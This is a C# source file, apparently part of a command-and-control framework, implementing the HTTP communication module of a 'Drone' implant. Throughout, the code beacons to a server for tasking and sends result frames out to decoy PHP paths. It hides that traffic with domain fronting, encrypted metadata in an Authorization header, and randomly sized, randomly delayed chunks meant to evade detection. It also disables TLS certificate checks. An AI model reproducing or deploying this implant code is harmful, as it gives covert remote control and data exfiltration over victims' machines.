using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;

namespace Drone.CommModules;

public class HttpCommModule : EgressCommModule
{
    private HttpClient _client;
    
    // Chunking configuration
    private bool _enableChunking;
    private int _minChunkSize = 512;
    private int _maxChunkSize = 4096;
    private int _minDelay = 10;
    private int _maxDelay = 100;

    public override ModuleType Type => ModuleType.EGRESS;
    public override ModuleMode Mode => ModuleMode.CLIENT;
    
    public override void Init(Metadata metadata)
    {
        var handler = new HttpClientHandler();
        handler.ServerCertificateCustomValidationCallback += ServerCertificateCustomValidationCallback;
        
        _client = new HttpClient(handler);
        
        // Support for domain fronting
        var frontDomain = Config.Get<string>("FrontDomain");
        var actualDomain = Config.Get<string>("ActualDomain");
        
        _client.BaseAddress = new Uri($"{Schema}://{ConnectAddress}:{ConnectPort}");
        _client.DefaultRequestHeaders.Clear();
        
        // Add Host header for domain fronting if configured
        if (!string.IsNullOrEmpty(frontDomain) && !string.IsNullOrEmpty(actualDomain))
        {
            _client.DefaultRequestHeaders.Host = actualDomain;
        }

        var enc = Crypto.Encrypt(metadata);
        _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {Convert.ToBase64String(enc)}");
        
        // Configure chunking
        _enableChunking = Config.Get<bool>("EnableChunking");
        _minChunkSize = Config.Get<int>("MinChunkSize", 512);
        _maxChunkSize = Config.Get<int>("MaxChunkSize", 4096);
        _minDelay = Config.Get<int>("MinChunkDelay", 10);
        _maxDelay = Config.Get<int>("MaxChunkDelay", 100);
    }

    public override async Task<IEnumerable<C2Frame>> CheckIn()
    {
        try
        {
            var response = await _client.GetByteArrayAsync(GetRandomPath(Verb.GET));
            return response.Deserialize<IEnumerable<C2Frame>>();
        }
        catch
        {
            return Array.Empty<C2Frame>();
        }
    }

    public override async Task SendFrame(C2Frame frame)
    {
        var serializedFrame = frame.Serialize();
        
        try
        {
            if (_enableChunking && serializedFrame.Length > _minChunkSize)
            {
                await SendChunkedFrame(serializedFrame);
            }
            else
            {
                var content = new ByteArrayContent(serializedFrame);
                await _client.PostAsync(GetRandomPath(Verb.POST), content);
            }
        }
        catch
        {
            // ignore
        }
    }

    private async Task SendChunkedFrame(byte[] data)
    {
        var chunks = ChunkingUtility.ChunkData(data, ChunkingUtility.GetRandomChunkSize(_minChunkSize, _maxChunkSize)).ToList();
        var totalChunks = chunks.Count;
        
        for (var i = 0; i < chunks.Count; i++)
        {
            var content = new ByteArrayContent(chunks[i]);
            var request = new HttpRequestMessage(HttpMethod.Post, GetRandomPath(Verb.POST));
            request.Content = content;
            
            // Add chunking headers
            request.Headers.Add("X-Chunk-Index", i.ToString());
            request.Headers.Add("X-Total-Chunks", totalChunks.ToString());
            
            await _client.SendAsync(request);
            
            if (i < chunks.Count - 1)
            {
                await ChunkingUtility.DelayBetweenChunks(_minDelay, _maxDelay);
            }
        }
    }
    
    private static bool ServerCertificateCustomValidationCallback(HttpRequestMessage arg1, X509Certificate2 arg2, X509Chain arg3, SslPolicyErrors arg4)
    {
        return true;
    }

    private static string GetRandomPath(Verb verb)
    {
        var paths = verb switch
        {
            Verb.GET => GetPaths.Split(';'),
            Verb.POST => PostPaths.Split(';'),
            
            _ => throw new ArgumentOutOfRangeException(nameof(verb), verb, null)
        };

        var rand = new Random();
        var index = rand.Next(0, paths.Length - 1);

        return paths[index];
    }

    private enum Verb
    {
        GET,
        POST
    }

    private static string Schema => "http";
    private static string ConnectAddress => "localhost";
    private static string ConnectPort => "8080";
    private static string GetPaths => "/index.php";
    private static string PostPaths => "/submit.php";
}
